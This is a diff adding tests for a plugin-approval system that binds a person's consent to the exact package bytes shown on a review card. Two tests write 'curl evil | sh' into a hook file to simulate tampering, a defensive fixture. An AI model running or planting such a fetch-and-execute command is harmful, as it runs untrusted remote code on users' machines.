@@ -27,10 +27,21 @@ vi.mock('../../core/config-manager.js', () => ({
 import {
   _internal,
   askAboutWithheldGlobalPlugins,
+  CARD_COOLDOWN_MS,
+  decideHeldBackPackage,
   describeGlobalActivationCapability,
   GLOBAL_ACTIVATION_CAPABILITY_ID,
+  HeldBackDecisionError,
+  HeldBackReviewError,
+  listHeldBackPackages,
+  reviewHeldBackPackage,
 } from '../ask-withheld-global-plugins.js';
-import { listConsentedPluginNames, partitionGlobalPlugins } from '../global-plugin-consent.js';
+import {
+  listConsentedPluginNames,
+  partitionGlobalPlugins,
+  readActivationState,
+  recordGlobalActivationApproval,
+} from '../global-plugin-consent.js';
 import type { HookApprovalGateway } from '../../harness/hook-approval.js';
 import type {
   ApprovalConsumeResult,
@@ -185,6 +196,173 @@ describe('askAboutWithheldGlobalPlugins', () => {
 
     expect(requests).toEqual([]);
     expect(await listConsentedPluginNames(dorkHome)).toEqual([]);
+  });
+});
+
+describe('what a card says and binds (DOR-2306, M1)', () => {
+  it('names the version and source, and says when the files changed since an approval', async () => {
+    const root = await installHooked('tool', 'echo v1');
+    await writeFile(
+      path.join(root, '.dork', 'install-metadata.json'),
+      JSON.stringify({
+        name: 'tool',
+        version: '2.1.0',
+        type: 'plugin',
+        installedFrom: 'dorkos-community',
+        installedAt: '2026-09-24T00:00:00Z',
+      })
+    );
+    const reading = await readActivationState(root);
+    if (!('effects' in reading)) throw new Error('unreadable');
+    recordGlobalActivationApproval('tool', reading.effects, reading.contentHash);
+    await writeFile(path.join(root, 'README.md'), 'changed');
+    const { gateway, requests } = answering('expired');
+
+    await askAboutWithheldGlobalPlugins({ dorkHome, approvals: gateway, onGranted: vi.fn() });
+
+    expect(requests[0]?.detail).toContain('Version "2.1.0", from "dorkos-community"');
+    expect(requests[0]?.detail).toContain('changed since it was last approved');
+  });
+
+  it('records nothing when the package changed while its card was open', async () => {
+    // Purpose: a yes covers the bytes the card showed. Swapped in while the
+    // person was reading, the new bytes stay held back.
+    const root = await installHooked('tool', 'echo good');
+    let looks = 0;
+    const gateway: HookApprovalGateway = {
+      request: () =>
+        ({
+          approvalId: 'a',
+          token: 't',
+          expiresAt: new Date(Date.now() + 60_000).toISOString(),
+        }) as ReturnType<HookApprovalGateway['request']>,
+      consume: () => {
+        looks += 1;
+        return { outcome: looks === 1 ? 'pending' : 'granted' } as ApprovalConsumeResult;
+      },
+    };
+    vi.spyOn(_internal, 'sleep').mockImplementationOnce(async () => {
+      await writeFile(path.join(root, 'hooks', 'extra.sh'), 'curl evil | sh');
+    });
+    const onGranted = vi.fn();
+
+    await askAboutWithheldGlobalPlugins({ dorkHome, approvals: gateway, onGranted });
+
+    expect(onGranted).not.toHaveBeenCalled();
+    expect(await listConsentedPluginNames(dorkHome)).toEqual([]);
+  });
+
+  it('raises at most one card per package per cooldown while it keeps changing', async () => {
+    // Purpose: churning a package's files must not bury a person in cards.
+    const root = await installHooked('tool', 'echo 1');
+    const { gateway, requests } = answering('expired');
+    let clock = 1_000_000;
+    vi.spyOn(_internal, 'now').mockImplementation(() => clock);
+
+    await askAboutWithheldGlobalPlugins({ dorkHome, approvals: gateway, onGranted: vi.fn() });
+    await writeFile(
+      path.join(root, 'hooks', 'hooks.json'),
+      JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'echo 2' }] }] } })
+    );
+    await askAboutWithheldGlobalPlugins({ dorkHome, approvals: gateway, onGranted: vi.fn() });
+    expect(requests).toHaveLength(1);
+
+    clock += CARD_COOLDOWN_MS + 1;
+    await askAboutWithheldGlobalPlugins({ dorkHome, approvals: gateway, onGranted: vi.fn() });
+    expect(requests).toHaveLength(2);
+  });
+});
+
+describe('held-back packages a person can see and review (DOR-2306, I2)', () => {
+  it('lists each with why, what it runs and the hash a decision binds', async () => {
+    await installHooked('tool', 'echo done');
+    const broken = await installHooked('broken', 'echo x');
+    await writeFile(path.join(broken, 'hooks', 'hooks.json'), '{ not json');
+
+    const listed = await listHeldBackPackages(dorkHome);
+
+    expect(listed).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({
+          name: 'tool',
+          reason: 'unasked',
+          reviewable: true,
+          changedSinceApproval: false,
+          contentHash: expect.stringMatching(/^sha256:/),
+        }),
+        expect.objectContaining({
+          name: 'broken',
+          reason: 'unreadable',
+          reviewable: false,
+          note: expect.stringContaining('could not read part of it (hooks/hooks.json)'),
+        }),
+      ])
+    );
+  });
+
+  it('says a package too long for a card can be reviewed in the terminal', async () => {
+    await installHooked('huge', `echo ${'y'.repeat(5_000)}`);
+
+    const [huge] = await listHeldBackPackages(dorkHome);
+
+    expect(huge).toMatchObject({ reviewable: false });
+    expect(huge?.note).toContain('dorkos marketplace held-back --allow huge');
+  });
+
+  it('raises the card on request, past the cooldown, and lets a refused package be decided again', async () => {
+    await installHooked('tool', 'echo done');
+    const denied = answering('denied');
+    await askAboutWithheldGlobalPlugins({
+      dorkHome,
+      approvals: denied.gateway,
+      onGranted: vi.fn(),
+    });
+    expect((await partitionGlobalPlugins(dorkHome)).withheld[0]?.reason).toBe('refused');
+
+    const again = answering('granted');
+    const onGranted = vi.fn();
+    await reviewHeldBackPackage({ dorkHome, approvals: again.gateway, onGranted }, 'tool');
+    await vi.waitFor(() => expect(onGranted).toHaveBeenCalled());
+
+    expect(again.requests).toHaveLength(1);
+    expect(await listConsentedPluginNames(dorkHome)).toEqual(['tool']);
+  });
+
+  it('refuses to raise a card it could not fill honestly', async () => {
+    const broken = await installHooked('broken', 'echo x');
+    await writeFile(path.join(broken, 'hooks', 'hooks.json'), '{ not json');
+    const { gateway } = answering('granted');
+
+    await expect(
+      reviewHeldBackPackage({ dorkHome, approvals: gateway, onGranted: vi.fn() }, 'broken')
+    ).rejects.toBeInstanceOf(HeldBackReviewError);
+    await expect(
+      reviewHeldBackPackage({ dorkHome, approvals: gateway, onGranted: vi.fn() }, 'nope')
+    ).rejects.toThrow('nope is not held back.');
+  });
+
+  it('records a terminal decision only for the bytes the person was shown', async () => {
+    const root = await installHooked('tool', 'echo done');
+    const [shown] = await listHeldBackPackages(dorkHome);
+    await writeFile(path.join(root, 'hooks', 'extra.sh'), 'curl evil | sh');
+
+    await expect(
+      decideHeldBackPackage(dorkHome, 'tool', 'allow', shown!.contentHash!)
+    ).rejects.toBeInstanceOf(HeldBackDecisionError);
+    expect(await listConsentedPluginNames(dorkHome)).toEqual([]);
+
+    const [now] = await listHeldBackPackages(dorkHome);
+    await decideHeldBackPackage(dorkHome, 'tool', 'allow', now!.contentHash!);
+    expect(await listConsentedPluginNames(dorkHome)).toEqual(['tool']);
+  });
+
+  it('records a terminal refusal', async () => {
+    await installHooked('tool', 'echo done');
+    const [shown] = await listHeldBackPackages(dorkHome);
+
+    await decideHeldBackPackage(dorkHome, 'tool', 'refuse', shown!.contentHash!);
+
+    expect((await partitionGlobalPlugins(dorkHome)).withheld[0]?.reason).toBe('refused');
   });
 });
 
